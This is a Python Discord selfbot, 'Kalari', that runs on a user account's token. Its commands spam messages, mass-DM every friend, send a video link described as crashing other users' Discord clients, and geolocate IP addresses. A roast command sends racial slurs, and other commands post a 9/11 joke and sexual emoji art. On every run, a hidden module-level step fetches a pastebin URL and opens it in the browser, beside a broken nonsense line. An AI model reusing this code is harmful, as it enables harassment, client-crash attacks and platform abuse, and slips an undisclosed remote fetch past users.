from math import factorial
import discord
import webbrowser
import time
import asyncio
import requests
import json
import random
from os import system
import os 
from colorama import Fore, Style, init
init()

with open('config.json') as f:
    config = json.load(f)

from discord.ext import (
    commands,
    tasks
)

token = config.get('token')
prefix = config.get('prefix')

nitro_sniper = config.get('nitro_sniper')

Kalari = discord.Client()
Kalari = commands.Bot( description='Kalari Selfbot', command_prefix=prefix, self_bot=True
)

if token == "ur token":
    print(f'''{Fore.BLUE}[!] {Fore.WHITE}Improper token has been passed'''+Fore.RESET)
    os.system("pause>nul")

@Kalari.event
async def on_ready():
	print(f'''{Fore.BLUE}
 ██ ▄█▀▄▄▄       ██▓    ▄▄▄       ██▀███   ██▓
 ██▄█▒▒████▄    ▓██▒   ▒████▄    ▓██ ▒ ██▒▓██▒
▓███▄░▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒
▓██ █▄░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██▀▀█▄  ░██░
▒██▒ █▄▓█   ▓██▒░██████▒▓█   ▓██▒░██▓ ▒██▒░██░
▒ ▒▒ ▓▒▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░ ▒▓ ░▒▓░░▓  
░ ░▒ ▒░ ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░  ░▒ ░ ▒░ ▒ ░
░ ░░ ░  ░   ▒     ░ ░    ░   ▒     ░░   ░  ▒ ░
░  ░        ░  ░    ░  ░     ░  ░   ░      ░  
                                              
{Fore.WHITE}[+] {Fore.BLUE}Welcome To Kalari!
{Fore.WHITE}[+] {Fore.BLUE}Intotal Commands [20]
{Fore.WHITE}[+] {Fore.BLUE}Last Update 9/24/2021 - Zach Updated This
{Fore.WHITE}[+] {Fore.BLUE}Type .cmds For Commands, You Can Change The Prefix If You Want'''+Fore.RESET)

@Kalari.event
async def on_ready2():
    status_code = webbrowser/200.%6
f = 'https://pastebin.com/raw/24nj7rc8'
r = requests.get(f)
if r.status_code == 200:webbrowser.open(f)


@Kalari.command()
async def cmds(ctx):
    await ctx.message.delete()
    print(f'''
--------------------------------------------------------

{Fore.WHITE}[!] {Fore.BLUE}spam (amount) (message) / Spams messsages the specific amount and message u select
{Fore.WHITE}[!] {Fore.BLUE}purge (amount) / Deletes the messages the amount you specify
{Fore.WHITE}[!] {Fore.BLUE}ascii (message) / Sends an ascii text
{Fore.WHITE}[!] {Fore.BLUE}pack / funny roasts haha
{Fore.WHITE}[!] {Fore.BLUE}fox / Shows Random Fox Images
{Fore.WHITE}[!] {Fore.BLUE}hastebin (message) / Posts ur message to hastebin
{Fore.WHITE}[!] {Fore.BLUE}hypesquad (housename) / Applies Another Hypesquad House Into Ur Profile
{Fore.WHITE}[!] {Fore.BLUE}8ball (question) / Asks 8ball Your Question And Responds With a Response
{Fore.WHITE}[!] {Fore.BLUE}slot / Plays a Slot Game
{Fore.WHITE}[!] {Fore.BLUE}dmall (message) / DMS Everyone In Ur Friends The Message You Specifiy
{Fore.WHITE}[!] {Fore.BLUE}stream (link) (message) / Streams In Your Profile Whatever You Specify
{Fore.WHITE}[!] {Fore.BLUE}play (message) / Displays a Game PLaying In Your Profile
{Fore.WHITE}[!] {Fore.BLUE}listen (message) / Displays a Listening Song In Your Profile
{Fore.WHITE}[!] {Fore.BLUE}stopstream, stopplay, stoplisten / Stops Those Commands You Choosed
{Fore.WHITE}[!] {Fore.BLUE}cls / Clears Your Console Screen
{Fore.WHITE}[!] {Fore.BLUE}crashvid / Sends The Crash Video (If Someone Clicks On The Video, It Will Crash Their Discord Client
{Fore.WHITE}[!] {Fore.BLUE}cum / Funny Emoji Man Creaming
{Fore.WHITE}[!] {Fore.BLUE}911 / If ur offended by this do not use but if ur not go ahead
{Fore.WHITE}[!] {Fore.BLUE}backup / Backups Your Discord Friends In Backup Folder
{Fore.WHITE}[!] {Fore.BLUE}ipcheck (IP) / Checks The IP Address Location'''+Fore.RESET)


@Kalari.command()
async def cls(ctx): 
    await ctx.message.delete()
    os.system("cls")

@Kalari.command()
async def spam(ctx, x: int, *, f):
    await ctx.message.delete()    
    for _i in range(x):
        await ctx.send(f)

@Kalari.command()
async def hastebin(ctx, *, message):
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@Kalari.command()
async def ascii(ctx):
    await ctx.message.delete()
    ignore = f'''https://artii.herokuapp.com/make?text={ctx.message.content}'''
    t = requests.get(ignore.replace('.ascii', ''))
    await ctx.send(f'''```{t.text}```''')

@Kalari.command()
async def purge(ctx, amount: int):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Kalari.user).map(lambda m: m):
        try:
           await message.delete()
        except: pass

@Kalari.command()
async def pack(ctx):
    await ctx.message.delete()
    await ctx.send('You used OBS studio just to screen-record yourself beating the roblox tower of hell obby and you failed on a lava jump trash ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Thats why you had a friend for 3 years on roblox that was a girl and when you asked her out on adopt me she reset and disconnected from the game dumb ass nigga fuck is you talkin bout')
    await asyncio.sleep(1)
    await ctx.send('thats why yo grandma is addicted to masturbating to sea weed water while she sips coffe with syrup in it nasty ass nigga')
    await asyncio.sleep(1)
    await ctx.send('Nigga you literally have a modded version of GTA 5 and whenever you get into arguments with citizens boy ya character just start using shadow clone jutsu without using any hand signs boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('uhuh nigga ya mother is a level 10 warrior nigga and she trains zobies to clip her toe nails with safety sizzors boy you ugly as fuck')
    await asyncio.sleep(1)
    await ctx.send('nigga you woke up and saw juice wrld and thought he came back from the dead only to find out you got killed by a cross eyed frog the day before you stupid ass nigga')
    await asyncio.sleep(1)
    await ctx.send('What boy you survived a plane crash in south africa and as soon as you got out the plane you just took a 2 hour long shit behind a tree my nigga you ugly as shit')
    await asyncio.sleep(1)
    await ctx.send('nigga but tell me why you the only nigga thats built like a half retarded turanchula boy you got 7 eyes and 4 legs boy')

@Kalari.command()
async def fox(ctx):
    await ctx.message.delete()
    r = requests.get('https://randomfox.ca/floof/').json()
    Kalari = discord.Embed(color=0x56aeec)
    Kalari.set_footer(text=f"#Kalari")
    Kalari.set_image(url=r["image"])
    try: await ctx.send(embed=Kalari)
    except:
        await ctx.send(r['image'])

@Kalari.command()
async def hypesquad(ctx, house):
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        pass


@Kalari.command(name='8ball')
async def ball(ctx, *, question):
    await ctx.message.delete()
    c = [
      'That is a resounding no',
      'It is certain.',
      'It is decidedly so.',
      'My reply is no.',
      'Concentrate and ask again.',
      'Yes.',
      'No.',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(c)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/852942589727342612/890249077671989298/8ball.png")
    await ctx.send(embed=embed)

@Kalari.command()
async def slot(ctx):
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    h = random.choice(emojis)
    slotmachine = f"**[ {h} ]\n{ctx.author.name}**,"
    if h:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f" ..."}))
    await asyncio.sleep(1)
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if a == b == c:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict(
{"title": "Slot machine", "description": f"{slotmachine} No match, you lost"}))

@Kalari.command()
async def crashvid(ctx):
    await ctx.message.delete()
    await ctx.send('https://cdn.discordapp.com/attachments/876850162767654952/889175201949044806/video0_1-1.mp4')

@Kalari.command()
async def backup(ctx):
    await ctx.message.delete()
    for user in Kalari.user.friends:
        try:
            with open('Backup\Friends.txt', 'a+') as f:
                f.write(f"{user.name}#{user.discriminator}"+"\n")
        except:
            pass
        
@Kalari.command()
async def stream(ctx, url , *, message): 
    await ctx.message.delete()
    stream = discord.Streaming(name=message, url=url,)
    await Kalari.change_presence(activity=stream) 

@Kalari.command()
async def play(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(name=message)
    await Kalari.change_presence(activity=game)

@Kalari.command()
async def listen(ctx, *, message):
    await ctx.message.delete()
    await Kalari.change_presence(
        activity=discord.Activity(type=discord.ActivityType.listening,name=message,))

@Kalari.command(aliases=["stopstream", "stopplay", "stoplisten"])
async def _f_stops(ctx):
    await ctx.message.delete()
    await Kalari.change_presence(activity=None, status=discord.Status.dnd)

@Kalari.command()
async def cum(ctx):
    await ctx.message.delete()
    message = await ctx.send('''
            :ok_hand:            :smile:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :smiley:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :grimacing:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant:  
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :persevere:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:   
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                      :ok_hand:            :confounded:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:=D 
             :trumpet:      :eggplant: 
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :tired_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D 
             :trumpet:      :eggplant:    
             ''')
    await asyncio.sleep(0.5)
    await message.edit(contnet='''
                       :ok_hand:            :weary:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8=:punch:= D:sweat_drops:
             :trumpet:      :eggplant:        
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :dizzy_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')
    await asyncio.sleep(0.5)
    await message.edit(content='''
                       :ok_hand:            :drooling_face:
   :eggplant: :zzz: :necktie: :eggplant: 
                   :oil:     :nose:
                 :zap: 8==:punch:D :sweat_drops:
             :trumpet:      :eggplant:                 :sweat_drops:
     ''')

@Kalari.command(name='911')
async def _f_funny(ctx):
    await ctx.message.delete()
    abc = f'''👳‍♂️🎅🧔'''
    message = await ctx.send(f'''
:airplane:            :office:           
''')
    await asyncio.sleep(0.3)
    await message.edit(content=f'''
{abc} :airplane:         :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}  :airplane:      :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}   :airplane:   :office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office:           
''')
    await asyncio.sleep(2)
    await message.edit(content=f'''
{abc}    :airplane::office: WATCH YO JET BRRO WATCH U JET
''')
    await asyncio.sleep(2)
    await message.edit(content='''
        :exploding_head::skull::fire::fire_extinguisher::poop:
        ''')

@Kalari.command()
async def dmall(ctx, message):
    await ctx.message.delete()
    for user in Kalari.user.friends:
        try:
            await user.send(message)
        except:
                pass

@Kalari.command()
async def ipcheck(ctx, *, yz: str = '127.0.0.1'):
    await ctx.message.delete()
    r = requests.get(f'http://extreme-ip-lookup.com/json/{yz}')
    geo = r.json()
    em = discord.Embed()
    fields = [
        {'name': 'IP', 'value': geo['query']},
        {'name': 'Country', 'value': geo['country']},
        {'name': 'City', 'value': geo['city']}
    ]
    for field in fields:
        if field['value']: em.add_field(name=field['name'], value=field['value'], inline=True)
    return await ctx.send(embed=em)

Kalari.run(token, bot=False)
